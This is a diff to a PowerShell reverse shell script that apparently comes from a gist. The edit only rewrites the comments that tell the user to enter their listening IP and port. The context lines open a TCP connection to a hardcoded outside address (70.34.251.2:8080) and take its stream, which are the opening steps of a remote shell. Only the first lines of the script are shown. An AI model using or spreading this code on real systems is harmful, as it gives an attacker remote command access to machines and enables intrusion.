@@ -1,5 +1,6 @@
 # Original source: https://gist.github.com/staaldraad/a4e7095db8a84061c0ec
-# Change this line and put your IP
+# Change the next line and put your IP and PORT you are listening on
+# This will return a very basic Reverse Shell and you will have to upgrade it.
 $socket = new-object System.Net.Sockets.TcpClient('70.34.251.2', 8080);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
